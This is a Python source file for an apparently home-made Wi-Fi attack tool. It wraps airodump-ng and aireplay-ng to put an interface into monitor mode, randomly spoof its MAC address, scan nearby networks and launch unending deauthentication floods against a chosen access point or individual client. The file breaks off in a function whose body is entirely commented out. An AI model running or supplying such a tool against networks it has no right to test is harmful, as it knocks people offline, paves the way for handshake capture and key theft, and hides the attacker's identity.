#!/usr/bin/env python
import csv
import os
import re
import time
import glob
import random
import signal
import keyboard
import subprocess

selected_interface = ""
target_ap = ""
target_bssid = ""
target_channel = ""
target_device = ""
target_ap_authentication = ""
target_router_oui = ""
interface_mac_address = ""
ap_list_of_target_oui = []
device_list_of_target_ap = []
terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']

ssid_map = {}
ssid_counter = ''
terminal_pids = []
target_ap_key = 0
terminal_positions = [(0, 0), (0, 400), (0, 800), (800, 0), (800, 400),
                      (800, 800)]  # top-right, middle-right, bottom-right, top-left, middle-left, bottom-left


#### methods for other methods
def check_for_q_press(interval=0.1, timeout=3):
    start_time = time.time()
    while time.time() - start_time < timeout:
        if keyboard.is_pressed('q'):
            return True
        time.sleep(interval)
    return False

def get_screen_resolution():
    output = check_command_output("xdpyinfo | grep dimensions")
    resolution = output.split()[1].split('x')
    return int(resolution[0]), int(resolution[1])


def red(string):
    return f'\033[91m{string}\033[0m'


def green(string):
    return f'\033[92m{string}\033[0m'


def purple(string):
    return f'\033[95m{string}\033[0m'


def yellow(string):
    return f'\033[33m{string}\033[0m'


def blue(string):
    return f'\033[34m{string}\033[0m'


def magenta(string):
    return f'\033[35m{string}\033[0m'


def cyan(string):
    return f'\033[36m{string}\033[0m'


def white(string):
    return f'\033[37m{string}\033[0m'


def clear():
    subprocess.run('clear')


def run_command(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        return result.stdout
    else:
        return result.stderr


def run_command_print_output(command):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    print(f"Command: {command}")
    if result.returncode == 0:
        print(f"{green('Output')}   :   " + result.stdout)
        print("-" * 30)
        return result.stdout
    else:
        print(f"{red('Error')}      :   " + result.stderr)
        print("-" * 30)
        return result.stderr


def popen_command(command, killtime=0):
    print(yellow(f'running {command} for {killtime} seconds'))
    process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    if killtime:
        # print(yellow(f'if process does not finish in {killtime} seconds, press enter to kill it'))
        time.sleep(killtime)
        os.killpg(process.pid, signal.SIGTERM)
        process.wait()
        output, error = process.communicate()
        output = output.decode('latin1')  # sometimes airodump output causes issues with utf-8
        error = error.decode('latin1')
        return output, error


def popen_command_new_terminal(command):
    for terminal in terminals:
        screen_width, screen_height = get_screen_resolution()
        terminal_width = screen_width // 2
        terminal_height = screen_height // 3

        try:
            if terminal == 'x-terminal-emulator':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} -geometry {terminal_width}x{terminal_height}+{x}+{y} -e 'bash -c \"{command}; exec bash\"'"
            elif terminal == 'gnome-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                if not terminal_positions:
                    print("No more positions available for new terminals.")
                    continue
                position_index = len(terminal_pids) % 6
                x, y = terminal_positions[position_index]
                terminal_command = f"{terminal} --geometry=80x24+{x}+{y} -e '/bin/sh -c \"{command}; exec bash\"'"
                # terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:  # xterm
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            # print(f"Executing command: {terminal_command}\n")
            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, text=True)
            terminal_pids.append(process.pid)
            return process

        except Exception as e:
            print(f"Failed to execute command in {terminal}: {e} \n")


def check_command_output(command):
    output = subprocess.check_output(command, shell=True, text=True)
    return output


def check_if_selected_interface_in_monitor_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    interface_settings = run_command(f'iwconfig {selected_interface}')
    if 'monitor' in interface_settings.lower():
        return True
    else:
        return False


def switch_interface_to_monitor_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    print('Setting ' + selected_interface + ' to monitor mode ')
    run_command(f'ifconfig {selected_interface} down')
    run_command(f'iwconfig {selected_interface} mode monitor')
    run_command(f'ifconfig {selected_interface} up')


def switch_interface_to_managed_mode():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    print('Setting ' + selected_interface + ' to managed mode ')
    run_command(f'ifconfig {selected_interface} down')
    run_command(f'iwconfig {selected_interface} mode managed')
    run_command(f'ifconfig {selected_interface} up')


def get_mac_of_interface():
    global interface_mac_address
    output = run_command(f'ip link show {selected_interface}')
    mac_address_search = re.search(r'link/\S+ (\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)', output)
    if mac_address_search:
        interface_mac_address = mac_address_search.group(1)
    else:
        print(f'error with {magenta("get_mac_of_interface")}')


def spoof_mac_of_interface_with_random_byte():
    if not selected_interface:
        if input(f'No {green("Interface")} specified. Do you want to select an interface Y/N : ').lower() == 'y':
            change_interface()
        return
    global interface_mac_address
    print(f'current interface is {selected_interface} and current MAC address is {interface_mac_address}')
    run_command_print_output(f'ip link set dev {selected_interface} down')
    first_bit = ['2', '3', '4', '5', '6', '7', '8', 'a', 'b', 'c', 'd', 'e', 'f']
    second_bit = ['2', '4', '6', '8', 'c', 'e']
    first_octet = random.choice(first_bit) + random.choice(second_bit)
    random_mac = f'{first_octet}:' + ':'.join(f"{random.randint(0x00, 0xFF):02X}" for _ in range(5))

    print(f'randomly selected mac for {selected_interface} is {random_mac}')
    run_command_print_output(f'ip link set dev {selected_interface} address {random_mac}')
    # time.sleep(0.3)
    run_command(f'ip link set dev {selected_interface} up')
    # time.sleep(0.3)
    get_mac_of_interface()


def scan_for_networks():
    clear()
    global ssid_map
    global ssid_counter
    output, error = popen_command(f'airodump-ng {selected_interface}', killtime=10)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
        end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
        end_index = output.rfind(end_pattern)
        start_index = output.rfind(start_pattern, 0, end_index)
        if end_index == -1 or start_index == -1:
            print('unknown pattern error 1')
            return
        else:
            output = output[start_index:end_index]
        found_SSIDS = []
        ssid_counter = 0
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                    column[10]) == '][' and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                if column[10] not in [ssid[1] for ssid in found_SSIDS]:
                    ssid_counter += 1
                    found_SSIDS.append([ssid_counter, column[10]])
                    ssid_map[ssid_counter] = [column[10],column[0],column[0][:8],column[5],column[-3]]
    else:
        print(f'Scan was not successful due to {green(selected_interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')


def deauthentication(target=target_bssid):
    if target == target_bssid:
        popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target} --ignore-negative-one {selected_interface}')
    elif target == target_device:
        popen_command_new_terminal(
            f'aireplay-ng --deauth 0 -a {target_bssid} -c {target_device} --ignore-negative-one {selected_interface}')

def deauthentication_interval(interval=0):
    aireplay = popen_command_new_terminal(
        f'aireplay-ng --deauth 0 -a {target_bssid} --ignore-negative-one {selected_interface}')
    interval_time = interval
    while interval_time > 0:
        print(
            f"Deauthenticating {green(target_bssid)}. Remaining time {green(interval_time)} Press Q to cancel")
        if check_for_q_press(timeout=1):
            print("Loop canceled by user.")
            return
        interval_time -= 1
    try:
        os.killpg(aireplay.pid, signal.SIGKILL)
        aireplay.wait()
    except ProcessLookupError:
        return

#### methods for the main menu

def change_interface():
    global selected_interface
    print("Available Network Interfaces: \n")
    interfaces = run_command("iw dev | grep Interface | awk '{print $2}'").split('\n')
    select_with_number = []
    interface_count = 0
    for intf in interfaces:
        if intf != '':
            interface_count += 1
            select_with_number.append([interface_count, intf])
            print(f'{green(select_with_number[interface_count - 1][0])}) {select_with_number[interface_count - 1][1]}')
    while True:
        selection = input(f"\nEnter the number of the interface {green('(type exit to return)')} : ")
        if selection.lower() == 'exit':
            break
        elif selection.isnumeric():
            if interface_count >= int(selection) > 0:
                selected_interface = select_with_number[int(selection) - 1][1]
                get_mac_of_interface()
                break
            elif int(selection) > interface_count:
                print(f'Selected interface ({selection}) {red("does not exist")}')

def select_target_ap(scan=True):
    clear()
    global target_ap
    global target_bssid
    global target_channel
    global target_ap_authentication
    if scan:
        scan_for_networks()
    while 1:
        for key, value in ssid_map.items():
            print("{:<2} {:<35} {:<17} {:<8} {:<2} {:<3}".format(f'{cyan(key)})', blue(value[0]), yellow(value[1]),
                                                                 green(value[2]), cyan(value[3]),
                                                                 magenta(value[4])))

        print('\nif desired SSID is not listed, please return and scan again.')
        selection = input(f"\nEnter the number of the SSID {green('(type exit to return)')} : ")
        if selection == 'exit':
            break
        elif selection.isnumeric():
            if len(ssid_map) >= int(selection) > 0:
                target_ap = ssid_map[int(selection)][0]
                target_bssid = ssid_map[int(selection)][1]
                target_channel = ssid_map[int(selection)][3]
                target_ap_authentication = ssid_map[int(selection)][4]
            elif int(selection) > len(ssid_map):
                print(f'Selected interface ({selection}) {red("does not exist")}')



def select_target_oui():

    # global target_router_oui
    # global ap_list_of_target_oui
    # ap_list_of_target_oui = []
    # clear()
    # popen_command(f'airodump-ng -w temp_output --output-format csv {selected_interface}', killtime=10)
    # with open('temp_output-01.csv', 'r') as f:
    #     reader = csv.reader(f)
    #     data = [(row[0], row[-2]) for row in reader if len(row) >= 13 and ':' in row[0]]
    # # Sort data by OUI
    # data.sort(key=lambda x: x[0][:8])
    # current_oui = ''
    # print_list = []
    # oui_list = []
    #
    # for mac, ssid in data:
    #     oui = mac[:8]
    #     if oui != current_oui and ssid != '' and oui != '00:00:00':
    #         current_oui = oui
    #         oui_list.append(oui)
    #         print_list.append(f"OUI: {yellow(oui)}")
    #     print_list.append(f" - {blue(ssid)} : {mac}")
    # remove_files_with_prefix(os.getcwd(), 'temp_output')
    # clear()
    # for i in print_list:
    #     print(f'{i}\n')
    # while 1:
    #     print(f'{blue("----------------------------------------------------------------------")}')
    #     selected_oui = input(f'Select an {yellow("OUI")} from the output / {red("999")} to cancel : ').replace(f" ", "")
    #     if selected_oui == '999':
    #         return
    #     elif selected_oui in oui_list:
    #         target_router_oui = selected_oui
    #         for mac, ssid in data:
    #             if mac[:8] == target_router_oui:
    #                 ap_list_of_target_oui.append(mac)
    #         return
    #     else:
    #         print(print_list)
    #         print(f'Selected {yellow("OUI")} ({green(selected_oui)}) {red("does not exist")}')
